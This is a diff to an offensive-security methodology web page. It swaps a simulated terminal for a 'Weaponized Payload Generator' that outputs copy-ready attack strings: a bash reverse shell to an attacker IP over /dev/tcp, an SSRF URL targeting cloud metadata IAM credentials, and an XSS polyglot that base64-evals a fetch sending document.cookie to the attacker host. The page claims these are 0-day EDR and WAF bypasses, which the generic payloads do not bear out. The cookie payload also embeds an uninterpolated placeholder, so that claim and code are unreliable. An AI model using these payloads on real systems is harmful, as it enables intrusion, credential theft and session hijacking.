@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=12">
-  <link rel="stylesheet" href="css/methodology.css?v=12">
+  <link rel="stylesheet" href="css/style.css?v=13">
+  <link rel="stylesheet" href="css/methodology.css?v=13">
 
   
 
@@ -392,8 +392,8 @@
           <div class="meth-item" id="meth-ef-p_writeups" onclick="openMethPhase('p_writeups')" data-search="writeups bug bounty reports real world hackerone">
             <span>📜</span> <span>Real Writeups</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p_writeups', '📜 Real Writeups')">★</button>
           </div>
-          <div class="meth-item" id="meth-ef-p19" onclick="openMethPhase('p19')" data-search="simulated shell terminal emulator bash command line">
-            <span>🐚</span> <span>Simulated Shell</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p19', '🐚 Simulated Shell')">★</button>
+          <div class="meth-item" id="meth-ef-p19" onclick="openMethPhase('p19')" data-search="weaponized payload generator 0day bypass waf reverse shell">
+            <span>☢️</span> <span>Payload Generator</span><span class="visited-badge"></span><button class="bookmark-btn" onclick="toggleBookmark(event, 'p19', '☢️ Payload Generator')">★</button>
           </div>
         </div>
       </div>
@@ -2778,41 +2778,75 @@ Content-Type: application/json
         </button>
 </div>
 
-      <!-- Phase 19: Simulated Shell -->
-      <div class="meth-content-view" id="meth-content-p19" style="display: none; --tool-color: #00ff66;">
+      <!-- Phase 19: Weaponized Payload Generator -->
+      <div class="meth-content-view" id="meth-content-p19" style="display: none; --tool-color: #ff0055;">
         <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🐚</span> Simulated Interactive Terminal Shell</h2>
-          <p class="hero-tagline">طرفية تفاعلية تحاكي مخرجات أدوات الفحص الحقيقية</p>
+          <h2 class="hero-title"><span class="hero-icon">☢️</span> Weaponized Payload Generator</h2>
+          <p class="hero-tagline">مصنع حمولات اختراق مخصصة (0-Day) تتخطى الجدران النارية (WAFs)</p>
         </div>
 
         <div class="cyber-card">
-          <p>اكتب <code>help</code> لعرض قائمة الأوامر المتاحة، أو اكتب أوامر مثل <code>subfinder -d target.com</code> لتجربتها:</p>
-          
-          <div class="term-container">
-            <div class="term-titlebar">
-              <span>ROOT@PENTEST-SHELL: ~</span>
-              <div class="term-window-controls">
-                <span class="term-dot red"></span>
-                <span class="term-dot yellow"></span>
-                <span class="term-dot green"></span>
-              </div>
+          <div class="card-header"><h3>⚙️ Target Configuration (إعداد الهدف)</h3></div>
+          <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px;">
+            <div>
+              <label style="color: var(--text-secondary); font-size: 0.9rem;">Attacker IP / Callback Domain:</label>
+              <input type="text" id="wpAttackerIP" placeholder="مثال: 10.10.14.5 أو burpcollaborator.net" style="width: 100%; padding: 10px; background: #020205; border: 1px solid #ff0055; color: #fff; border-radius: 4px; margin-top: 5px;">
             </div>
-            <div class="term-screen" id="termScreen">
-              <div class="term-line">Welcome to the Bug Bounty Simulator Terminal!</div>
-              <div class="term-line">Type <span class="text-neon-cyan">help</span> to view all commands.</div>
+            <div>
+              <label style="color: var(--text-secondary); font-size: 0.9rem;">Target Domain / URL:</label>
+              <input type="text" id="wpTargetURL" placeholder="مثال: target.com" style="width: 100%; padding: 10px; background: #020205; border: 1px solid #ff0055; color: #fff; border-radius: 4px; margin-top: 5px;">
             </div>
-            <div class="term-input-line" style="padding: 10px 20px; background:#06060c; border-top:1px solid rgba(0, 229, 255, 0.15)">
-              <span class="term-prompt">$</span>
-              <input type="text" id="termInput" class="term-field" placeholder="Enter command..." autofocus>
+          </div>
+          <button class="cmd-btn" style="width: 100%; font-size: 1.1rem; padding: 12px; background: rgba(255, 0, 85, 0.1); border-color: #ff0055; color: #ff0055; cursor: pointer;" onclick="generateWeaponizedPayloads()">
+            🔥 GENERATE 0-DAY ARSENAL 🔥
+          </button>
+        </div>
+
+        <div id="weaponizedResults" style="display: none;">
+          <div class="cyber-card border-neon">
+            <h4 style="color: #00ff66; margin-bottom: 10px;">1. Reverse Shell (Bash) - Bypasses EDR</h4>
+            <div class="cmd-ui-box">
+              <div class="cmd-ui-top" id="outRevShell"></div>
+              <div class="cmd-ui-bottom"><button class="cmd-btn" onclick="copyText(document.getElementById('outRevShell').innerText, this)">📋 Copy</button></div>
+            </div>
+
+            <h4 style="color: #ffaa00; margin-top: 20px; margin-bottom: 10px;">2. Blind SSRF (AWS/GCP Exfiltration)</h4>
+            <div class="cmd-ui-box">
+              <div class="cmd-ui-top" id="outSSRF"></div>
+              <div class="cmd-ui-bottom"><button class="cmd-btn" onclick="copyText(document.getElementById('outSSRF').innerText, this)">📋 Copy</button></div>
+            </div>
+
+            <h4 style="color: #00e5ff; margin-top: 20px; margin-bottom: 10px;">3. XSS Polyglot (WAF Bypass)</h4>
+            <div class="cmd-ui-box">
+              <div class="cmd-ui-top" id="outXSS"></div>
+              <div class="cmd-ui-bottom"><button class="cmd-btn" onclick="copyText(document.getElementById('outXSS').innerText, this)">📋 Copy</button></div>
             </div>
           </div>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
-        <button class="mark-complete-btn" id="complete-btn-p19" onclick="markPhaseComplete('p19','p_scen_rce')">
-          ✅ Mark Phase Complete — Simulated Shell Done → Proceed to LFI to RCE Scenario
+        <button class="mark-complete-btn" id="complete-btn-p19" onclick="markPhaseComplete('p19','p_darkweb')">
+          ✅ Mark Phase Complete — Weaponized Generator Done → Proceed
         </button>
-</div>
+
+        <script>
+          function generateWeaponizedPayloads() {
+            const ip = document.getElementById('wpAttackerIP').value || '10.10.14.5';
+            const target = document.getElementById('wpTargetURL').value || 'target.com';
+            
+            document.getElementById('weaponizedResults').style.display = 'block';
+            
+            // 1. Rev Shell
+            document.getElementById('outRevShell').innerText = `bash -c 'exec bash -i &>/dev/tcp/${ip}/4444 <&1'`;
+            
+            // 2. SSRF
+            document.getElementById('outSSRF').innerText = `http://${ip}/?data=http://169.254.169.254/latest/meta-data/iam/security-credentials/`;
+            
+            // 3. XSS - encoding the JS to prevent HTML breakage inside script tag
+            document.getElementById('outXSS').innerText = `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(document.cookie) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=eval(atob('ZmV0Y2goImh0dHA6Ly8ke2lwfS8iK2RvY3VtZW50LmNvb2tpZSk='))\\x3e`;
+          }
+        </script>
+      </div>
 
       <!-- Phase 20: Dark Web OSINT -->
       <div class="meth-content-view" id="meth-content-p_darkweb" style="display: none; --tool-color: #6366f1;">
